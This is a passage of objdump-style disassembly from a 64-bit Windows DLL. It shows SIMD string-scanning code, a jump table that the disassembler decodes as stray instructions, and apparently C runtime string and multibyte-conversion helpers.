   18000acc6:	eb 13                	jmp    0x18000acdb
   18000acc8:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000accd:	eb 0c                	jmp    0x18000acdb
   18000accf:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000acd4:	eb 05                	jmp    0x18000acdb
   18000acd6:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   18000acdb:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000acde:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   18000ace4:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000ace8:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000acec:	85 c0                	test   %eax,%eax
   18000acee:	0f 84 2f 01 00 00    	je     0x18000ae23
   18000acf4:	0f bc d0             	bsf    %eax,%edx
   18000acf7:	4d 85 d2             	test   %r10,%r10
   18000acfa:	75 06                	jne    0x18000ad02
   18000acfc:	41 8d 79 f2          	lea    -0xe(%r9),%edi
   18000ad00:	eb 11                	jmp    0x18000ad13
   18000ad02:	b9 10 00 00 00       	mov    $0x10,%ecx
   18000ad07:	8b c2                	mov    %edx,%eax
   18000ad09:	49 2b ca             	sub    %r10,%rcx
   18000ad0c:	48 3b c1             	cmp    %rcx,%rax
   18000ad0f:	40 0f 92 c7          	setb   %dil
   18000ad13:	41 8b c1             	mov    %r9d,%eax
   18000ad16:	2b c2                	sub    %edx,%eax
   18000ad18:	41 3b c1             	cmp    %r9d,%eax
   18000ad1b:	0f 87 cf 00 00 00    	ja     0x18000adf0
   18000ad21:	8b 8c 86 68 af 00 00 	mov    0xaf68(%rsi,%rax,4),%ecx
   18000ad28:	48 03 ce             	add    %rsi,%rcx
   18000ad2b:	ff e1                	jmp    *%rcx
   18000ad2d:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   18000ad32:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   18000ad37:	e9 b4 00 00 00       	jmp    0x18000adf0
   18000ad3c:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   18000ad41:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   18000ad46:	e9 a5 00 00 00       	jmp    0x18000adf0
   18000ad4b:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   18000ad50:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   18000ad55:	e9 96 00 00 00       	jmp    0x18000adf0
   18000ad5a:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   18000ad5f:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   18000ad64:	e9 87 00 00 00       	jmp    0x18000adf0
   18000ad69:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   18000ad6e:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   18000ad73:	eb 7b                	jmp    0x18000adf0
   18000ad75:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   18000ad7a:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   18000ad7f:	eb 6f                	jmp    0x18000adf0
   18000ad81:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   18000ad86:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   18000ad8b:	eb 63                	jmp    0x18000adf0
   18000ad8d:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   18000ad92:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   18000ad97:	eb 57                	jmp    0x18000adf0
   18000ad99:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   18000ad9e:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   18000ada3:	eb 4b                	jmp    0x18000adf0
   18000ada5:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   18000adaa:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   18000adaf:	eb 3f                	jmp    0x18000adf0
   18000adb1:	66 0f 73 f9 0b       	pslldq $0xb,%xmm1
   18000adb6:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   18000adbb:	eb 33                	jmp    0x18000adf0
   18000adbd:	66 0f 73 f9 0c       	pslldq $0xc,%xmm1
   18000adc2:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   18000adc7:	eb 27                	jmp    0x18000adf0
   18000adc9:	66 0f 73 f9 0d       	pslldq $0xd,%xmm1
   18000adce:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   18000add3:	eb 1b                	jmp    0x18000adf0
   18000add5:	66 0f 73 f9 0e       	pslldq $0xe,%xmm1
   18000adda:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   18000addf:	eb 0f                	jmp    0x18000adf0
   18000ade1:	66 0f 73 f9 0f       	pslldq $0xf,%xmm1
   18000ade6:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   18000adeb:	eb 03                	jmp    0x18000adf0
   18000aded:	0f 57 c9             	xorps  %xmm1,%xmm1
   18000adf0:	85 ff                	test   %edi,%edi
   18000adf2:	0f 85 e1 00 00 00    	jne    0x18000aed9
   18000adf8:	f3 0f 6f 53 10       	movdqu 0x10(%rbx),%xmm2
   18000adfd:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   18000ae01:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   18000ae05:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000ae09:	85 c0                	test   %eax,%eax
   18000ae0b:	75 35                	jne    0x18000ae42
   18000ae0d:	49 8b d3             	mov    %r11,%rdx
   18000ae10:	49 8b c8             	mov    %r8,%rcx
   18000ae13:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000ae18:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   18000ae1d:	5f                   	pop    %rdi
   18000ae1e:	e9 6d fd ff ff       	jmp    0x18000ab90
   18000ae23:	4d 85 d2             	test   %r10,%r10
   18000ae26:	75 d0                	jne    0x18000adf8
   18000ae28:	40 38 7b 01          	cmp    %dil,0x1(%rbx)
   18000ae2c:	0f 84 a7 00 00 00    	je     0x18000aed9
   18000ae32:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000ae37:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   18000ae3c:	5f                   	pop    %rdi
   18000ae3d:	e9 4e fd ff ff       	jmp    0x18000ab90
   18000ae42:	0f bc c8             	bsf    %eax,%ecx
   18000ae45:	8b c1                	mov    %ecx,%eax
   18000ae47:	49 2b c2             	sub    %r10,%rax
   18000ae4a:	48 83 c0 10          	add    $0x10,%rax
   18000ae4e:	48 83 f8 10          	cmp    $0x10,%rax
   18000ae52:	77 b9                	ja     0x18000ae0d
   18000ae54:	44 2b c9             	sub    %ecx,%r9d
   18000ae57:	41 83 f9 0f          	cmp    $0xf,%r9d
   18000ae5b:	77 79                	ja     0x18000aed6
   18000ae5d:	42 8b 8c 8e a8 af 00 	mov    0xafa8(%rsi,%r9,4),%ecx
   18000ae64:	00 
   18000ae65:	48 03 ce             	add    %rsi,%rcx
   18000ae68:	ff e1                	jmp    *%rcx
   18000ae6a:	66 0f 73 fa 01       	pslldq $0x1,%xmm2
   18000ae6f:	eb 65                	jmp    0x18000aed6
   18000ae71:	66 0f 73 fa 02       	pslldq $0x2,%xmm2
   18000ae76:	eb 5e                	jmp    0x18000aed6
   18000ae78:	66 0f 73 fa 03       	pslldq $0x3,%xmm2
   18000ae7d:	eb 57                	jmp    0x18000aed6
   18000ae7f:	66 0f 73 fa 04       	pslldq $0x4,%xmm2
   18000ae84:	eb 50                	jmp    0x18000aed6
   18000ae86:	66 0f 73 fa 05       	pslldq $0x5,%xmm2
   18000ae8b:	eb 49                	jmp    0x18000aed6
   18000ae8d:	66 0f 73 fa 06       	pslldq $0x6,%xmm2
   18000ae92:	eb 42                	jmp    0x18000aed6
   18000ae94:	66 0f 73 fa 07       	pslldq $0x7,%xmm2
   18000ae99:	eb 3b                	jmp    0x18000aed6
   18000ae9b:	66 0f 73 fa 08       	pslldq $0x8,%xmm2
   18000aea0:	eb 34                	jmp    0x18000aed6
   18000aea2:	66 0f 73 fa 09       	pslldq $0x9,%xmm2
   18000aea7:	eb 2d                	jmp    0x18000aed6
   18000aea9:	66 0f 73 fa 0a       	pslldq $0xa,%xmm2
   18000aeae:	eb 26                	jmp    0x18000aed6
   18000aeb0:	66 0f 73 fa 0b       	pslldq $0xb,%xmm2
   18000aeb5:	eb 1f                	jmp    0x18000aed6
   18000aeb7:	66 0f 73 fa 0c       	pslldq $0xc,%xmm2
   18000aebc:	eb 18                	jmp    0x18000aed6
   18000aebe:	66 0f 73 fa 0d       	pslldq $0xd,%xmm2
   18000aec3:	eb 11                	jmp    0x18000aed6
   18000aec5:	66 0f 73 fa 0e       	pslldq $0xe,%xmm2
   18000aeca:	eb 0a                	jmp    0x18000aed6
   18000aecc:	66 0f 73 fa 0f       	pslldq $0xf,%xmm2
   18000aed1:	eb 03                	jmp    0x18000aed6
   18000aed3:	0f 57 d2             	xorps  %xmm2,%xmm2
   18000aed6:	0f 56 ca             	orps   %xmm2,%xmm1
   18000aed9:	41 0f b6 00          	movzbl (%r8),%eax
   18000aedd:	84 c0                	test   %al,%al
   18000aedf:	74 2c                	je     0x18000af0d
   18000aee1:	0f be c0             	movsbl %al,%eax
   18000aee4:	66 0f 6e c0          	movd   %eax,%xmm0
   18000aee8:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   18000aeec:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   18000aef0:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   18000aef5:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000aef9:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000aefd:	85 c0                	test   %eax,%eax
   18000aeff:	75 1a                	jne    0x18000af1b
   18000af01:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   18000af06:	49 ff c0             	inc    %r8
   18000af09:	84 c0                	test   %al,%al
   18000af0b:	75 d4                	jne    0x18000aee1
   18000af0d:	33 c0                	xor    %eax,%eax
   18000af0f:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000af14:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   18000af19:	5f                   	pop    %rdi
   18000af1a:	c3                   	ret
   18000af1b:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   18000af20:	49 8b c0             	mov    %r8,%rax
   18000af23:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   18000af28:	5f                   	pop    %rdi
   18000af29:	c3                   	ret
   18000af2a:	66 90                	xchg   %ax,%ax
   18000af2c:	74 ac                	je     0x18000aeda
   18000af2e:	00 00                	add    %al,(%rax)
   18000af30:	7b ac                	jnp    0x18000aede
   18000af32:	00 00                	add    %al,(%rax)
   18000af34:	82                   	(bad)
   18000af35:	ac                   	lods   (%rsi),%al
   18000af36:	00 00                	add    %al,(%rax)
   18000af38:	89 ac 00 00 90 ac 00 	mov    %ebp,0xac9000(%rax,%rax,1)
   18000af3f:	00 97 ac 00 00 9e    	add    %dl,-0x61ffff54(%rdi)
   18000af45:	ac                   	lods   (%rsi),%al
   18000af46:	00 00                	add    %al,(%rax)
   18000af48:	a5                   	movsl  (%rsi),(%rdi)
   18000af49:	ac                   	lods   (%rsi),%al
   18000af4a:	00 00                	add    %al,(%rax)
   18000af4c:	ac                   	lods   (%rsi),%al
   18000af4d:	ac                   	lods   (%rsi),%al
   18000af4e:	00 00                	add    %al,(%rax)
   18000af50:	b3 ac                	mov    $0xac,%bl
   18000af52:	00 00                	add    %al,(%rax)
   18000af54:	ba ac 00 00 c1       	mov    $0xc10000ac,%edx
   18000af59:	ac                   	lods   (%rsi),%al
   18000af5a:	00 00                	add    %al,(%rax)
   18000af5c:	c8 ac 00 00          	enter  $0xac,$0x0
   18000af60:	cf                   	iret
   18000af61:	ac                   	lods   (%rsi),%al
   18000af62:	00 00                	add    %al,(%rax)
   18000af64:	d6                   	udb
   18000af65:	ac                   	lods   (%rsi),%al
   18000af66:	00 00                	add    %al,(%rax)
   18000af68:	2d ad 00 00 3c       	sub    $0x3c0000ad,%eax
   18000af6d:	ad                   	lods   (%rsi),%eax
   18000af6e:	00 00                	add    %al,(%rax)
   18000af70:	4b ad                	rex.WXB lods (%rsi),%rax
   18000af72:	00 00                	add    %al,(%rax)
   18000af74:	5a                   	pop    %rdx
   18000af75:	ad                   	lods   (%rsi),%eax
   18000af76:	00 00                	add    %al,(%rax)
   18000af78:	69 ad 00 00 75 ad 00 	imul   $0xad810000,-0x528b0000(%rbp),%ebp
   18000af7f:	00 81 ad 
   18000af82:	00 00                	add    %al,(%rax)
   18000af84:	8d ad 00 00 99 ad    	lea    -0x52670000(%rbp),%ebp
   18000af8a:	00 00                	add    %al,(%rax)
   18000af8c:	a5                   	movsl  (%rsi),(%rdi)
   18000af8d:	ad                   	lods   (%rsi),%eax
   18000af8e:	00 00                	add    %al,(%rax)
   18000af90:	b1 ad                	mov    $0xad,%cl
   18000af92:	00 00                	add    %al,(%rax)
   18000af94:	bd ad 00 00 c9       	mov    $0xc90000ad,%ebp
   18000af99:	ad                   	lods   (%rsi),%eax
   18000af9a:	00 00                	add    %al,(%rax)
   18000af9c:	d5 ad 00 00          	{rex2 0xad} sldt (%r8)
   18000afa0:	e1 ad                	loope  0x18000af4f
   18000afa2:	00 00                	add    %al,(%rax)
   18000afa4:	ed                   	in     (%dx),%eax
   18000afa5:	ad                   	lods   (%rsi),%eax
   18000afa6:	00 00                	add    %al,(%rax)
   18000afa8:	6a ae                	push   $0xffffffffffffffae
   18000afaa:	00 00                	add    %al,(%rax)
   18000afac:	71 ae                	jno    0x18000af5c
   18000afae:	00 00                	add    %al,(%rax)
   18000afb0:	78 ae                	js     0x18000af60
   18000afb2:	00 00                	add    %al,(%rax)
   18000afb4:	7f ae                	jg     0x18000af64
   18000afb6:	00 00                	add    %al,(%rax)
   18000afb8:	86 ae 00 00 8d ae    	xchg   %ch,-0x51730000(%rsi)
   18000afbe:	00 00                	add    %al,(%rax)
   18000afc0:	94                   	xchg   %eax,%esp
   18000afc1:	ae                   	scas   (%rdi),%al
   18000afc2:	00 00                	add    %al,(%rax)
   18000afc4:	9b                   	fwait
   18000afc5:	ae                   	scas   (%rdi),%al
   18000afc6:	00 00                	add    %al,(%rax)
   18000afc8:	a2 ae 00 00 a9 ae 00 	movabs %al,0xb00000aea90000ae
   18000afcf:	00 b0 
   18000afd1:	ae                   	scas   (%rdi),%al
   18000afd2:	00 00                	add    %al,(%rax)
   18000afd4:	b7 ae                	mov    $0xae,%bh
   18000afd6:	00 00                	add    %al,(%rax)
   18000afd8:	be ae 00 00 c5       	mov    $0xc50000ae,%esi
   18000afdd:	ae                   	scas   (%rdi),%al
   18000afde:	00 00                	add    %al,(%rax)
   18000afe0:	cc                   	int3
   18000afe1:	ae                   	scas   (%rdi),%al
   18000afe2:	00 00                	add    %al,(%rax)
   18000afe4:	d3 ae 00 00 45 33    	shrl   %cl,0x33450000(%rsi)
   18000afea:	c0 e9 00             	shr    $0x0,%cl
   18000afed:	00 00                	add    %al,(%rax)
   18000afef:	00 48 89             	add    %cl,-0x77(%rax)
   18000aff2:	5c                   	pop    %rsp
   18000aff3:	24 08                	and    $0x8,%al
   18000aff5:	57                   	push   %rdi
   18000aff6:	48 83 ec 40          	sub    $0x40,%rsp
   18000affa:	48 8b da             	mov    %rdx,%rbx
   18000affd:	48 8b f9             	mov    %rcx,%rdi
   18000b000:	48 85 c9             	test   %rcx,%rcx
   18000b003:	75 14                	jne    0x18000b019
   18000b005:	e8 ea b0 ff ff       	call   0x1800060f4
   18000b00a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000b010:	e8 37 af ff ff       	call   0x180005f4c
   18000b015:	33 c0                	xor    %eax,%eax
   18000b017:	eb 60                	jmp    0x18000b079
   18000b019:	48 85 db             	test   %rbx,%rbx
   18000b01c:	74 e7                	je     0x18000b005
   18000b01e:	48 3b fb             	cmp    %rbx,%rdi
   18000b021:	73 f2                	jae    0x18000b015
   18000b023:	49 8b d0             	mov    %r8,%rdx
   18000b026:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000b02b:	e8 10 99 ff ff       	call   0x180004940
   18000b030:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   18000b035:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   18000b039:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   18000b03d:	74 24                	je     0x18000b063
   18000b03f:	48 ff ca             	dec    %rdx
   18000b042:	48 3b fa             	cmp    %rdx,%rdi
   18000b045:	77 0a                	ja     0x18000b051
   18000b047:	0f b6 02             	movzbl (%rdx),%eax
   18000b04a:	f6 44 08 19 04       	testb  $0x4,0x19(%rax,%rcx,1)
   18000b04f:	75 ee                	jne    0x18000b03f
   18000b051:	48 8b cb             	mov    %rbx,%rcx
   18000b054:	48 2b ca             	sub    %rdx,%rcx
   18000b057:	48 8b d3             	mov    %rbx,%rdx
   18000b05a:	83 e1 01             	and    $0x1,%ecx
   18000b05d:	48 2b d1             	sub    %rcx,%rdx
   18000b060:	48 ff ca             	dec    %rdx
   18000b063:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000b068:	74 0c                	je     0x18000b076
   18000b06a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000b06f:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000b076:	48 8b c2             	mov    %rdx,%rax
   18000b079:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000b07e:	48 83 c4 40          	add    $0x40,%rsp
   18000b082:	5f                   	pop    %rdi
   18000b083:	c3                   	ret
   18000b084:	40 55                	rex push %rbp
   18000b086:	41 54                	push   %r12
   18000b088:	41 55                	push   %r13
   18000b08a:	41 56                	push   %r14
   18000b08c:	41 57                	push   %r15
   18000b08e:	48 83 ec 60          	sub    $0x60,%rsp
   18000b092:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   18000b097:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   18000b09b:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   18000b09f:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   18000b0a3:	48 8b 05 56 ef 00 00 	mov    0xef56(%rip),%rax        # 0x18001a000
   18000b0aa:	48 33 c5             	xor    %rbp,%rax
   18000b0ad:	48 89 45 08          	mov    %rax,0x8(%rbp)
   18000b0b1:	48 63 7d 60          	movslq 0x60(%rbp),%rdi
   18000b0b5:	49 8b f1             	mov    %r9,%rsi
   18000b0b8:	45 8b e0             	mov    %r8d,%r12d
   18000b0bb:	4c 8b ea             	mov    %rdx,%r13
   18000b0be:	48 8b d9             	mov    %rcx,%rbx
   18000b0c1:	85 ff                	test   %edi,%edi
   18000b0c3:	7e 14                	jle    0x18000b0d9
   18000b0c5:	48 8b d7             	mov    %rdi,%rdx
   18000b0c8:	49 8b c9             	mov    %r9,%rcx
   18000b0cb:	e8 d0 17 00 00       	call   0x18000c8a0
   18000b0d0:	3b c7                	cmp    %edi,%eax
   18000b0d2:	8d 78 01             	lea    0x1(%rax),%edi
   18000b0d5:	7c 02                	jl     0x18000b0d9
   18000b0d7:	8b f8                	mov    %eax,%edi
   18000b0d9:	44 8b 75 78          	mov    0x78(%rbp),%r14d
   18000b0dd:	45 85 f6             	test   %r14d,%r14d
   18000b0e0:	75 07                	jne    0x18000b0e9
   18000b0e2:	48 8b 03             	mov    (%rbx),%rax
   18000b0e5:	44 8b 70 0c          	mov    0xc(%rax),%r14d
   18000b0e9:	f7 9d 80 00 00 00    	negl   0x80(%rbp)
   18000b0ef:	44 8b cf             	mov    %edi,%r9d
   18000b0f2:	4c 8b c6             	mov    %rsi,%r8
   18000b0f5:	41 8b ce             	mov    %r14d,%ecx
   18000b0f8:	1b d2                	sbb    %edx,%edx
   18000b0fa:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000b0ff:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000b105:	83 e2 08             	and    $0x8,%edx
   18000b108:	ff c2                	inc    %edx
   18000b10a:	e8 7d d2 ff ff       	call   0x18000838c
   18000b10f:	33 d2                	xor    %edx,%edx
   18000b111:	4c 63 f8             	movslq %eax,%r15
   18000b114:	85 c0                	test   %eax,%eax
   18000b116:	0f 84 73 02 00 00    	je     0x18000b38f
   18000b11c:	49 8b c7             	mov    %r15,%rax
   18000b11f:	48 03 c0             	add    %rax,%rax
   18000b122:	48 8d 48 10          	lea    0x10(%rax),%rcx
   18000b126:	48 3b c1             	cmp    %rcx,%rax
   18000b129:	48 1b c0             	sbb    %rax,%rax
   18000b12c:	48 23 c1             	and    %rcx,%rax
   18000b12f:	0f 84 3d 02 00 00    	je     0x18000b372
   18000b135:	49 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%r8
   18000b13c:	ff ff 0f 
   18000b13f:	48 3d 00 04 00 00    	cmp    $0x400,%rax
   18000b145:	77 31                	ja     0x18000b178
   18000b147:	48 8d 48 0f          	lea    0xf(%rax),%rcx
   18000b14b:	48 3b c8             	cmp    %rax,%rcx
   18000b14e:	77 03                	ja     0x18000b153
   18000b150:	49 8b c8             	mov    %r8,%rcx
   18000b153:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   18000b157:	48 8b c1             	mov    %rcx,%rax
   18000b15a:	e8 d1 1f 00 00       	call   0x18000d130
   18000b15f:	48 2b e1             	sub    %rcx,%rsp
   18000b162:	48 8d 5c 24 50       	lea    0x50(%rsp),%rbx
   18000b167:	48 85 db             	test   %rbx,%rbx
   18000b16a:	0f 84 05 02 00 00    	je     0x18000b375
   18000b170:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   18000b176:	eb 18                	jmp    0x18000b190
   18000b178:	48 8b c8             	mov    %rax,%rcx
   18000b17b:	e8 70 e6 ff ff       	call   0x1800097f0
   18000b180:	33 d2                	xor    %edx,%edx
   18000b182:	48 8b d8             	mov    %rax,%rbx
   18000b185:	48 85 c0             	test   %rax,%rax
   18000b188:	74 0a                	je     0x18000b194
   18000b18a:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000b190:	48 83 c3 10          	add    $0x10,%rbx
   18000b194:	48 85 db             	test   %rbx,%rbx
   18000b197:	0f 84 d8 01 00 00    	je     0x18000b375
   18000b19d:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   18000b1a2:	44 8b cf             	mov    %edi,%r9d
   18000b1a5:	4c 8b c6             	mov    %rsi,%r8
   18000b1a8:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000b1ad:	ba 01 00 00 00       	mov    $0x1,%edx
   18000b1b2:	41 8b ce             	mov    %r14d,%ecx
   18000b1b5:	e8 d2 d1 ff ff       	call   0x18000838c
   18000b1ba:	33 d2                	xor    %edx,%edx
   18000b1bc:	85 c0                	test   %eax,%eax
   18000b1be:	0f 84 b1 01 00 00    	je     0x18000b375
   18000b1c4:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   18000b1c9:	45 8b cf             	mov    %r15d,%r9d
   18000b1cc:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   18000b1d1:	4c 8b c3             	mov    %rbx,%r8
   18000b1d4:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   18000b1d9:	49 8b cd             	mov    %r13,%rcx
   18000b1dc:	89 54 24 28          	mov    %edx,0x28(%rsp)
   18000b1e0:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   18000b1e5:	41 8b d4             	mov    %r12d,%edx
   18000b1e8:	e8 5b d7 ff ff       	call   0x180008948
   18000b1ed:	33 d2                	xor    %edx,%edx
   18000b1ef:	48 63 f0             	movslq %eax,%rsi
   18000b1f2:	85 c0                	test   %eax,%eax
   18000b1f4:	0f 84 7b 01 00 00    	je     0x18000b375
   18000b1fa:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   18000b200:	45 85 e0             	test   %r12d,%r8d
   18000b203:	74 51                	je     0x18000b256
   18000b205:	8b 45 70             	mov    0x70(%rbp),%eax
   18000b208:	85 c0                	test   %eax,%eax
   18000b20a:	0f 84 6c 01 00 00    	je     0x18000b37c
   18000b210:	3b f0                	cmp    %eax,%esi
   18000b212:	0f 8f 5d 01 00 00    	jg     0x18000b375
   18000b218:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   18000b21d:	45 8b cf             	mov    %r15d,%r9d
   18000b220:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   18000b225:	4c 8b c3             	mov    %rbx,%r8
   18000b228:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   18000b22d:	49 8b cd             	mov    %r13,%rcx
   18000b230:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000b234:	41 8b d4             	mov    %r12d,%edx
   18000b237:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000b23b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000b240:	e8 03 d7 ff ff       	call   0x180008948
   18000b245:	33 d2                	xor    %edx,%edx
   18000b247:	8b f0                	mov    %eax,%esi
   18000b249:	85 c0                	test   %eax,%eax
   18000b24b:	0f 85 2b 01 00 00    	jne    0x18000b37c
   18000b251:	e9 1f 01 00 00       	jmp    0x18000b375
   18000b256:	48 8b ce             	mov    %rsi,%rcx
   18000b259:	48 03 c9             	add    %rcx,%rcx
   18000b25c:	48 8d 41 10          	lea    0x10(%rcx),%rax
   18000b260:	48 3b c8             	cmp    %rax,%rcx
   18000b263:	48 1b c9             	sbb    %rcx,%rcx
   18000b266:	48 23 c8             	and    %rax,%rcx
   18000b269:	0f 84 e6 00 00 00    	je     0x18000b355
   18000b26f:	49 3b c8             	cmp    %r8,%rcx
   18000b272:	77 35                	ja     0x18000b2a9
   18000b274:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   18000b278:	48 3b c1             	cmp    %rcx,%rax
   18000b27b:	77 0a                	ja     0x18000b287
   18000b27d:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   18000b284:	ff ff 0f 
   18000b287:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   18000b28b:	e8 a0 1e 00 00       	call   0x18000d130
   18000b290:	48 2b e0             	sub    %rax,%rsp
   18000b293:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   18000b298:	48 85 ff             	test   %rdi,%rdi
   18000b29b:	0f 84 cd 00 00 00    	je     0x18000b36e
   18000b2a1:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   18000b2a7:	eb 15                	jmp    0x18000b2be
   18000b2a9:	e8 42 e5 ff ff       	call   0x1800097f0
   18000b2ae:	33 d2                	xor    %edx,%edx
   18000b2b0:	48 8b f8             	mov    %rax,%rdi
   18000b2b3:	48 85 c0             	test   %rax,%rax
   18000b2b6:	74 0a                	je     0x18000b2c2
   18000b2b8:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   18000b2be:	48 83 c7 10          	add    $0x10,%rdi
   18000b2c2:	48 85 ff             	test   %rdi,%rdi
   18000b2c5:	0f 84 a3 00 00 00    	je     0x18000b36e
   18000b2cb:	48 89 54 24 40       	mov    %rdx,0x40(%rsp)
   18000b2d0:	45 8b cf             	mov    %r15d,%r9d
   18000b2d3:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   18000b2d8:	4c 8b c3             	mov    %rbx,%r8
   18000b2db:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   18000b2e0:	49 8b cd             	mov    %r13,%rcx
   18000b2e3:	89 74 24 28          	mov    %esi,0x28(%rsp)
   18000b2e7:	41 8b d4             	mov    %r12d,%edx
   18000b2ea:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   18000b2ef:	e8 54 d6 ff ff       	call   0x180008948
   18000b2f4:	33 d2                	xor    %edx,%edx
   18000b2f6:	85 c0                	test   %eax,%eax
   18000b2f8:	74 5e                	je     0x18000b358
   18000b2fa:	8b 45 70             	mov    0x70(%rbp),%eax
   18000b2fd:	44 8b ce             	mov    %esi,%r9d
   18000b300:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   18000b305:	4c 8b c7             	mov    %rdi,%r8
   18000b308:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   18000b30d:	41 8b ce             	mov    %r14d,%ecx
   18000b310:	85 c0                	test   %eax,%eax
   18000b312:	75 16                	jne    0x18000b32a
   18000b314:	89 54 24 28          	mov    %edx,0x28(%rsp)
   18000b318:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   18000b31d:	e8 fa d0 ff ff       	call   0x18000841c
   18000b322:	8b f0                	mov    %eax,%esi
   18000b324:	85 c0                	test   %eax,%eax
   18000b326:	75 1a                	jne    0x18000b342
   18000b328:	eb 2e                	jmp    0x18000b358
   18000b32a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   18000b32e:	48 8b 45 68          	mov    0x68(%rbp),%rax
   18000b332:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000b337:	e8 e0 d0 ff ff       	call   0x18000841c
   18000b33c:	8b f0                	mov    %eax,%esi
   18000b33e:	85 c0                	test   %eax,%eax
   18000b340:	74 1b                	je     0x18000b35d
   18000b342:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   18000b346:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   18000b34c:	75 2e                	jne    0x18000b37c
   18000b34e:	e8 1d b7 ff ff       	call   0x180006a70
   18000b353:	eb 27                	jmp    0x18000b37c
   18000b355:	48 8b fa             	mov    %rdx,%rdi
   18000b358:	48 85 ff             	test   %rdi,%rdi
   18000b35b:	74 11                	je     0x18000b36e
   18000b35d:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
